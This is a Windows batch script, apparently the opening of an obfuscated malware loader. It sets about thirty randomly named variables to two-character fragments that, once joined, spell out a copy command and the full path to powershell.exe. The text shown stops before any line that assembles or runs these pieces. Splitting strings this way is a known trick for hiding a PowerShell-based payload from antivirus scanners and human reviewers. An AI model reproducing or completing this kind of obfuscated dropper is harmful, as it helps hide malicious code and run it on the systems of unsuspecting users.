@echo off
set "UaaWrjctjP=co"
set "isMueTIrYZ=we"
set "pspGKajXlX=s\"
set "RyzVVbyXDZ=Wi"
set "OzhBzLdMTz=xe"
set "bkawXRmQcT=0\"
set "TVCOZSMItE=1."
set "OlfXRfRfEs=ll"
set "fwoaAEhuqU=he"
set "PEHPvJxGse=ll"
set "AJkWqkElzO=y "
set "tjLarYpCay=rs"
set "yyttizJtLp=Sy"
set "iUSdALDNQy=.e"
set "UtwDMmhTXt=nd"
set "vTAZlcpzqL=do"
set "uHYxxgPVwC=py"
set "OgagVnKBVc=ow"
set "yIShZXvWsd= C"
set "rXbAKCeQSL=em"
set "iqZYprmqTw=\v"
set "nXzlbLxtaH=st"
set "dkIaVqMHXv=32"
set "ubhqWvJGQY=he"
set "ErQGPrSdFZ=\W"
set "TTYqZKRQvM=we"
set "TgWxBuRxFP=:\"
set "CPWEFBwSIG=in"
set "MoadjOBWEI= /"
set "csNTZMtsBG=rS"
set "ZPvEdZhuLs=ws"
set "KakTinndut=Po"
set "VoNixeciaE=po"
